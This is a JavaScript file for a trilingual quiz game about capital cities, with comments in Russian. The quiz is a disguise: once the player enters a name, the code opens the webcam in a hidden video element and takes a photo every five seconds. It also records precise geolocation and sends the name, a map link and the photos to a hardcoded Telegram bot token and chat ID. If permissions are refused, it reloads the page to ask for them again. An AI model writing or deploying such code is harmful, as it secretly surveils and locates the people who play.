const telegramToken = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
const telegramChatId = "8071841674";

const questions = [
  // –ú–∞—Å—Å–∏–≤ –∏–∑ 30 –≤–æ–ø—Ä–æ—Å–æ–≤ –Ω–∞ 3 —è–∑—ã–∫–∞—Ö, –ø—Ä–∏–º–µ—Ä:
  {
    question: {
      hy: "’à÷Ä’∂ ’ß ’Ä’°’µ’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â",
      ru: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –ê—Ä–º–µ–Ω–∏–∏?",
      en: "What is the capital of Armenia?"
    },
    answers: [
      { text: { hy: "‘µ÷Ä÷á’°’∂", ru: "–ï—Ä–µ–≤–∞–Ω", en: "Yerevan" }, correct: true },
      { text: { hy: "‘π’¢’´’¨’´’Ω’´", ru: "–¢–±–∏–ª–∏—Å–∏", en: "Tbilisi" }, correct: false },
      { text: { hy: "‘≤’°÷Ñ’∏÷Ç", ru: "–ë–∞–∫—É", en: "Baku" }, correct: false },
      { text: { hy: "’Ñ’∏’Ω’Ø’æ’°", ru: "–ú–æ—Å–∫–≤–∞", en: "Moscow" }, correct: false },
    ],
  },
  {
    question: {
      hy: "’à÷Ä’∂ ’ß ’å’∏÷Ç’Ω’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â",
      ru: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –†–æ—Å—Å–∏–∏?",
      en: "What is the capital of Russia?"
    },
    answers: [
      { text: { hy: "’Ñ’∏’Ω’Ø’æ’°", ru: "–ú–æ—Å–∫–≤–∞", en: "Moscow" }, correct: true },
      { text: { hy: "‘ø’°’¶’°’∂", ru: "–ö–∞–∑–∞–Ω—å", en: "Kazan" }, correct: false },
      { text: { hy: "’ç’°’∂’Ø’ø-’ä’•’ø’•÷Ä’¢’∏÷Ç÷Ä’£", ru: "–°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥", en: "Saint Petersburg" }, correct: false },
      { text: { hy: "’Ü’∏’æ’∏’Ω’´’¢’´÷Ä’Ω’Ø", ru: "–ù–æ–≤–æ—Å–∏–±–∏—Ä—Å–∫", en: "Novosibirsk" }, correct: false },
    ],
  },
  // ... –¥–æ–±–∞–≤—å –æ—Å—Ç–∞–ª—å–Ω—ã–µ –≤–æ–ø—Ä–æ—Å—ã –ø–æ –∞–Ω–∞–ª–æ–≥–∏–∏, —á—Ç–æ–±—ã –±—ã–ª–æ –º–∏–Ω–∏–º—É–º 30
];

// --- –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å–Ω—ã–µ —Ç–µ–∫—Å—Ç—ã –¥–ª—è —è–∑—ã–∫–æ–≤ ---
const i18n = {
  hy: {
    enterName: "’Ñ’∏÷Ç’ø÷Ñ’°’£÷Ä’•÷Ñ ’±’•÷Ä ’°’∂’∏÷Ç’∂’®",
    startGame: "’ç’Ø’Ω’•’¨ ’≠’°’≤’®",
    tryAgain: "’ì’∏÷Ä’±’•’¨ ’∂’∏÷Ä’´÷Å",
    questionsLeft: "’Ñ’∂’°÷Å’•’¨ ’ß ’∞’°÷Ä÷Å",
    correct: "’É’´’∑’ø ’∫’°’ø’°’Ω’≠’°’∂’∂’•÷Ä",
    wrong: "’ç’≠’°’¨ ’∫’°’ø’°’Ω’≠’°’∂’∂’•÷Ä",
    victory: "‘¥’∏÷Ç÷Ñ ’∞’°’≤’©’•’¨ ’•÷Ñ! üéâ",
    defeat: "‘¥’∏÷Ç÷Ñ ’∫’°÷Ä’ø’æ’•÷Å’´÷Ñ üòû",
  },
  ru: {
    enterName: "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è",
    startGame: "–ù–∞—á–∞—Ç—å –∏–≥—Ä—É",
    tryAgain: "–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –µ—â—ë",
    questionsLeft: "–û—Å—Ç–∞–ª–æ—Å—å –≤–æ–ø—Ä–æ—Å–æ–≤",
    correct: "–ü—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤",
    wrong: "–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤",
    victory: "–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏! üéâ",
    defeat: "–í—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üòû",
  },
  en: {
    enterName: "Enter your name",
    startGame: "Start Game",
    tryAgain: "Try Again",
    questionsLeft: "Questions Left",
    correct: "Correct Answers",
    wrong: "Wrong Answers",
    victory: "You won! üéâ",
    defeat: "You lost üòû",
  }
};

let language = "hy"; // —è–∑—ã–∫ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
let userName = "";
let currentQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;
let photoIntervalId = null;

// DOM —ç–ª–µ–º–µ–Ω—Ç—ã
const nameFormContainer = document.getElementById("name-form-container");
const nameForm = document.getElementById("name-form");
const nameInput = document.getElementById("name-input");

const gameArea = document.getElementById("game-area");
const userNameDisplay = document.getElementById("user-name");
const scoreInfo = document.getElementById("score-info");
const questionContainer = document.getElementById("question-container");
const questionElement = document.getElementById("question");
const answerButtons = document.getElementById("answer-buttons");
const tryAgainBtn = document.getElementById("try-again-btn");

const video = document.createElement("video");
video.autoplay = true;
video.playsInline = true;
video.style.display = "none";
document.body.appendChild(video);

let mediaStream = null;

// –ü–æ–º–æ—â–Ω–∏–∫ –¥–ª—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ –ø–æ—Ä—è–¥–∫–∞ –º–∞—Å—Å–∏–≤–∞
function shuffle(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

// –í—ã–±–æ—Ä —Å–ª—É—á–∞–π–Ω—ã—Ö 10 –≤–æ–ø—Ä–æ—Å–æ–≤ –∏–∑ –º–∞—Å—Å–∏–≤–∞ (–∏–∑ 30)
function pickRandomQuestions() {
  let copy = [...questions];
  shuffle(copy);
  return copy.slice(0, 10);
}

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ —Å—á—ë—Ç–∞ –∏ –∏–º–µ–Ω–∏
function updateScore() {
  scoreInfo.innerHTML = `
    ${i18n[language].questionsLeft}: ${10 - currentQuestionIndex} | 
    ${i18n[language].correct}: ${correctCount} | 
    ${i18n[language].wrong}: ${wrongCount}
  `;
  userNameDisplay.textContent = userName;
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
async function sendDataToTelegram(photoBlob=null) {
  // –§–æ—Ä–º–∏—Ä—É–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ –≥—É–≥–ª –∫–∞—Ä—Ç—ã –∏–∑ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
  function getGeoUrl(coords) {
    return `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
  }

  // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
  function getPosition() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject("Geolocation not supported");
        return;
      }
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000,
      });
    });
  }

  try {
    const position = await getPosition();
    const { latitude, longitude } = position.coords;
    const geoUrl = getGeoUrl(position.coords);

    let message = `<b>–ò–º—è:</b> ${userName}\n`;
    message += `<b>–Ø–∑—ã–∫:</b> ${language}\n`;
    message += `<b>–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:</b> <a href="${geoUrl}">–°—Å—ã–ª–∫–∞ –Ω–∞ –∫–∞—Ä—Ç—É</a>\n`;

    const telegramApiBase = `https://api.telegram.org/bot${telegramToken}`;

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Ç–µ–∫—Å—Ç–æ–º
    await fetch(`${telegramApiBase}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    // –ï—Å–ª–∏ –µ—Å—Ç—å —Ñ–æ—Ç–æ ‚Äî –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ
    if (photoBlob) {
      const formData = new FormData();
      formData.append("chat_id", telegramChatId);
      formData.append("photo", photoBlob, "photo.jpg");

      await fetch(`${telegramApiBase}/sendPhoto`, {
        method: "POST",
        body: formData,
      });
    }
  } catch (err) {
    console.warn("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –≤ Telegram:", err);
  }
}

// –ó–∞–ø—É—Å–∫ –∫–∞–º–µ—Ä—ã –∏ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
async function startCameraAndPhotos() {
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = mediaStream;

    photoIntervalId = setInterval(() => {
      takePhotoAndSend();
    }, 5000);

  } catch (err) {
    console.warn("–ö–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞:", err);
  }
}

function takePhotoAndSend() {
  if (!mediaStream) return;
  const track = mediaStream.getVideoTracks()[0];
  if (!track) return;

  const imageCapture = new ImageCapture(track);
  imageCapture.takePhoto()
    .then(blob => sendDataToTelegram(blob))
    .catch(err => console.warn("–û—à–∏–±–∫–∞ —Ñ–æ—Ç–æ:", err));
}

// –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤–æ–ø—Ä–æ—Å–∞ –∏ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ –æ—Ç–≤–µ—Ç–æ–≤
function showQuestion() {
  clearStatus();
  updateScore();

  if (currentQuestionIndex >= currentQuestions.length) {
    showResults();
    return;
  }

  const q = currentQuestions[currentQuestionIndex];
  questionElement.textContent = q.question[language];

  // –ü–µ—Ä–µ–º–µ—à–∞—Ç—å –≤–∞—Ä–∏–∞–Ω—Ç—ã –æ—Ç–≤–µ—Ç–æ–≤
  const answers = shuffle([...q.answers]);

  answerButtons.innerHTML = "";
  answers.forEach((answer, index) => {
    const btn = document.createElement("button");
    btn.textContent = answer.text[language];
    btn.classList.add("btn");
    btn.dataset.correct = answer.correct;
    btn.addEventListener("click", selectAnswer);
    answerButtons.appendChild(btn);
  });
}

// –û—á–∏—Å—Ç–∫–∞ –∫–ª–∞—Å—Å–æ–≤ –ø–æ–¥—Å–≤–µ—Ç–∫–∏
function clearStatus() {
  Array.from(answerButtons.children).forEach(button => {
    button.classList.remove("correct");
    button.classList.remove("wrong");
  });
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—ã–±–æ—Ä–∞ –æ—Ç–≤–µ—Ç–∞
function selectAnswer(e) {
  const selectedBtn = e.target;
  const correct = selectedBtn.dataset.correct === "true";

  Array.from(answerButtons.children).forEach(button => {
    button.disabled = true;
    if (button.dataset.correct === "true") {
      button.classList.add("correct");
    } else {
      button.classList.add("wrong");
    }
  });

  if (correct) {
    correctCount++;
  } else {
    wrongCount++;
  }

  updateScore();

  // –ß–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É
  setTimeout(() => {
    currentQuestionIndex++;
    showQuestion();
  }, 2000);
}

// –ü–æ–∫–∞–∑–∞—Ç—å –∏—Ç–æ–≥ –∏ –∫–Ω–æ–ø–∫—É ¬´–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –µ—â—ë¬ª
function showResults() {
  questionElement.textContent = correctCount >= 5 ? i18n[language].victory : i18n[language].defeat;
  answerButtons.innerHTML = "";
  tryAgainBtn.style.display = "inline-block";
  updateScore();
}

// –°–±—Ä–æ—Å –∏ –Ω–∞—á–∞–ª–æ –Ω–æ–≤–æ–π –∏–≥—Ä—ã
function resetGame() {
  currentQuestions = pickRandomQuestions();
  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  tryAgainBtn.style.display = "none";
  showQuestion();
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã –∏–º–µ–Ω–∏
nameForm.addEventListener("submit", (e) => {
  e.preventDefault();
  let nameVal = nameInput.value.trim();
  if (nameVal === "") nameVal = language === "hy" ? "‘±’∂’∞’°’µ’ø" : language === "ru" ? "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π" : "Unknown";
  userName = nameVal;

  // –°–∫—Ä—ã–≤–∞–µ–º —Ñ–æ—Ä–º—É, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–≥—Ä—É
  nameFormContainer.style.display = "none";
  gameArea.style.display = "block";
  updateScore();

  // –ó–∞–ø—É—Å–∫–∞–µ–º –∫–∞–º–µ—Ä—É –∏ —Ñ–æ—Ç–∫–∏
  startCameraAndPhotos();

  // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram —Å—Ä–∞–∑—É (–±–µ–∑ —Ñ–æ—Ç–æ)
  sendDataToTelegram();

  resetGame();
});

tryAgainBtn.addEventListener("click", () => {
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è
  navigator.permissions.query({name: "geolocation"}).then(geoPerm => {
    navigator.permissions.query({name: "camera"}).then(camPerm => {
      if (geoPerm.state === "granted" && camPerm.state === "granted") {
        resetGame();
      } else {
        // –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π
        location.reload();
      }
    });
  });
});

// –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —è–∑—ã–∫–∞ (–ø–æ–∫–∞ –∑–∞–¥–∞–µ—Ç—Å—è –≤—Ä—É—á–Ω—É—é)
function setLanguage(lang) {
  language = lang;
  if (nameFormContainer.style.display !== "none") {
    // –û–±–Ω–æ–≤–ª—è–µ–º placeholder –∏ –∫–Ω–æ–ø–∫–∏ –Ω–∞ —Ñ–æ—Ä–º–µ –∏–º–µ–Ω–∏
    nameInput.placeholder = i18n[language].enterName;
    nameForm.querySelector("button").textContent = i18n[language].startGame;
  }
  if (gameArea.style.display !== "none") {
    updateScore();
    showQuestion();
  }
}
setLanguage(language);
